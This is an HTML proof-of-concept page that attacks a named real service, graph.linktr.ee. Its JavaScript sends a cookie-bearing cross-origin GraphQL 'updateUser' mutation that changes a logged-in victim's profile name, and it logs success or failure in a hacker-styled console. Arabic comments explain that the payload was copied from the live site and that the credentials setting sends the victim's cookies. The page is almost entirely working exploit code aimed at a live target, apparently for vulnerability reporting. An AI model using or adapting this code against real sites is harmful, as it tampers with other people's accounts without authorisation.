<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Critical CORS Exploit - Account Takeover PoC</title>
    <style>
        body { font-family: 'Courier New', monospace; background: #0d1117; color: #f85149; text-align: center; padding: 50px; }
        .terminal { background: #161b22; border: 2px solid #f85149; padding: 30px; border-radius: 10px; display: inline-block; min-width: 600px; }
        #log { text-align: left; background: #010409; padding: 15px; border-radius: 5px; color: #7ee787; margin-top: 20px; white-space: pre-wrap; }
        button { background: #f85149; color: white; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; }
    </style>
</head>
<body>
    <div class="terminal">
        <h1>[!] ATTACK VECTOR: UNAUTHORIZED MUTATION</h1>
        <p>Target: graph.linktr.ee (UpdateUser)</p>
        
        <button onclick="changeVictimName()">FORCE PROFILE UPDATE</button>

        <div id="log">Console: Waiting for exploit trigger...</div>
    </div>

    <script>
        async function changeVictimName() {
            const log = document.getElementById("log");
            log.innerText = "[*] Initiating Mutation Attack...\n";

            const url = "https://graph.linktr.ee/graphql";
            
            // البيانات اللي إنت جبتها من الموقع الأصلي
            const payload = {
                query: `mutation ($input: UpdateUserInput!) {
                    updateUser(input: $input) {
                        success
                        __typename
                    }
                }`,
                variables: {
                    input: {
                        name: "Pwned_By_Tarek_CORS" // القيمة الجديدة اللي هتتغير عند الضحية
                    }
                }
            };

            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload),
                    credentials: 'include' // أهم سطر لإرسال الكوكيز
                });

                const result = await response.json();

                if (result.data && result.data.updateUser.success) {
                    log.innerHTML = "<b style='color:#7ee787'>[$$$] SUCCESS! Victim's profile name has been changed.</b>\n";
                    log.innerHTML += JSON.stringify(result.data, null, 4);
                } else {
                    log.innerHTML = "<b style='color:#ffa657'>[!] Mutation failed. Check Response:</b>\n" + JSON.stringify(result, null, 4);
                }
            } catch (err) {
                log.innerHTML = "<b style='color:#f85149'>[-] Error:</b> Preflight (OPTIONS) might be blocked or session expired.";
            }
        }
    </script>
